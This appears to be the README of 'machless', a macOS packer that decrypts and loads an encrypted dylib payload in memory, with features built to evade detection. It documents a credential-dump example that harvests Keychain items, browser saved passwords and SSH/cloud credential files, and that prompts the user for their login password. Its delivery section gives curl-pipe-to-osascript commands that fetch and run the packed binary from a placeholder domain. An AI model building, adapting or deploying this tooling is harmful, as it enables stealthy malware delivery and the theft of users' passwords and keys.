# machless

<div align="center">
  <img src="assets/machless.png" width="300" alt="machless logo">
</div>

Apple Silicon Mach-O packer using Patrick Wardle's ReflectiveLoader. It maps a
constructor-based dylib in the current process without writing the plaintext
dylib to disk.

## Build

```sh
make all
make pack INPUT=payload.dylib OUTPUT=packed_app
# Outputs are ad-hoc signed by default. Opt out explicitly if needed:
make pack INPUT=payload.dylib OUTPUT=packed_app SIGN_IDENTITY=
./packed_app
```

Single-layer output defaults to the local ChaCha20-Poly1305 implementation.
That keeps unused CommonCrypto GCM SPI symbols out of the final import table.
AES-GCM remains available:

```sh
make pack INPUT=payload.dylib OUTPUT=packed_app CIPHER=aes-gcm
```

The normal target retains only the ARM64 payload slice, links only its selected
decryptor, strips nonessential symbols, and ad-hoc signs the final image.
Set `SIGN_IDENTITY=` to leave it unsigned, or
`SIGN_IDENTITY="Developer ID Application: ..."` to use an available identity.

`KEEP_INTERMEDIATES=1` retains `<output>.packed` and the complementary
`<output>.profile.h`. The profile is sufficient to unwrap the container key;
normal builds keep it in a temporary file and remove the intermediate packed
blob after the final link or requested signing pass.

## Compatibility and limitations

- The supported final-output path is Apple Silicon/ARM64 and defaults to a
  macOS 15.0 deployment target. The generic container structures can describe
  x86_64 slices, but the current final build and execution path does not.
- Payloads must be 64-bit `MH_DYLIB` images built with
  `-Wl,-no_fixup_chains`. The current packer/execution contract does not accept
  modern `LC_DYLD_CHAINED_FIXUPS` payloads, executables, or bundles.
- Execution is constructor-based. Initializers run synchronously in the
  current process. A standalone packed executable exits after they return;
  long-running payload work therefore needs to keep that process alive or use
  the injectable-dylib path with an appropriate host.
- Only the payload image is supplied from memory. Its dependent libraries are
  still resolved through the system loader and must already be available or
  loadable by the host.
- The standalone outer executable still needs a disk-backed vnode for macOS
  to launch it. An entirely network-to-memory flow requires an existing native
  process that can load the injectable variant.
- Anonymous executable mappings require a compatible host and signing profile.
  Hardened-runtime deployments need the appropriate unsigned-executable-memory
  allowances and are not the supported default configuration.
- AEAD protects the embedded container from accidental or unauthenticated
  modification and conceals plaintext at rest. It is not a DRM boundary:
  someone with the complete executable can reconstruct the embedded key and
  inspect the payload while it runs.

## What changed in format 4

- Each build gets a random container marker instead of the old `LCAM` magic.
- The random payload key is XOR-split between the packed header and an encoded
  build profile compiled into the loader. The packed bytes no longer contain
  a directly usable decryption key.
- The container is placed in `__DATA_CONST,__auth_const`, avoiding a custom
  segment and stable packer-specific names. The loader finds the one valid
  container by walking its non-executable mapped sections.
- The source Mach-O buffer and resolved key are overwritten immediately after
  ReflectiveLoader copies the image into its final segment mappings.
- Final images use dead stripping, no exported symbols, local-symbol stripping,
  single-cipher linking, ARM64-only payload selection, and per-build rewriting
  of stable third-party loader name tokens before any requested signature.

Repack version 3 containers before using the current loader.

## Credential example

The three switches at the top of `examples/credential-dump/credentials.c`
select the collectors compiled into the example:

```c
#define KEYCHAIN 1 /* generic and internet-password Keychain items */
#define BROWSER  1 /* Chromium-family Login Data */
#define SECRETS  1 /* SSH and common cloud/developer credential files */
```

The Keychain collector enumerates generic-password and internet-password
records and requests each value with Security.framework. The browser collector
requests the matching Safe Storage item and decrypts v10/v11 saved passwords.
The file collector recursively checks bounded `.ssh`, `.aws`, `.azure`,
`.kube`, and selected cloud/developer configuration locations. Keychain ACLs,
Full Disk Access, and endpoint privacy controls still apply. The example has no
networking, child-process, or persistence code.

With `KEYCHAIN` or `BROWSER` enabled, the example asks Security.framework to
open one native SecurityAgent secure password sheet. It prints that entered
account/password pair, retains the password for the duration of the run, uses
it to authorize each legacy Keychain and Safe Storage lookup, and restores
each item's original ACL immediately after the read. Subsequent lookups are
non-interactive, so cancelling the initial sheet does not create a series of
password prompts. Records without a recovered secret are omitted from stdout.

```sh
make -C examples/credential-dump
make pack \
  INPUT=examples/credential-dump/build/credentials.dylib \
  OUTPUT=credential-demo \
  SIGN_IDENTITY=-
./credential-demo
```

`ML_CREDENTIAL_ROOT` changes the filesystem root for browser and file
collectors. `ML_KEYCHAIN_SERVICE` optionally limits Keychain enumeration to one
generic-password service for controlled testing.

## Delivery examples

`osa-install` is the conventional AppleScript path: it calls `curl`, `chmod`,
the staged binary, and `rm`. `osa-install2` is the lower-process-count JXA
variant. It performs the HTTP transfer and temporary-file operations inside
`osascript`, launches only the encrypted outer executable, captures stdout,
and removes it after completion.

```sh
osascript ./osa-install https://DOMAIN/packed_app
osascript -l JavaScript ./osa-install2 https://DOMAIN/packed_app

curl -fsS https://DOMAIN/osa-install2 | \
  osascript -l JavaScript - https://DOMAIN/packed_app
```

The JXA variant implements the lower-process-count staging path described in
the compatibility section; it does not change the standalone launch model.

## Other targets

```sh
make pack-dylib INPUT=payload.dylib OUTPUT=packed_loader.dylib
make matryoshka INPUT=payload.dylib OUTPUT=packed_nested
```

The dylib target initializes on load in a compatible host. The nested target
uses one shared split-key profile around independent AES-GCM and ChaCha20
containers. It adds crypto and mapping work and is not the preferred stealth
configuration; use the single ChaCha layer unless independent layers serve a
specific test.

Verify an explicitly signed artifact with:

```sh
codesign --verify --strict --all-architectures --verbose=4 ./packed_app
codesign -d --verbose=4 ./packed_app
otool -l ./packed_app
```
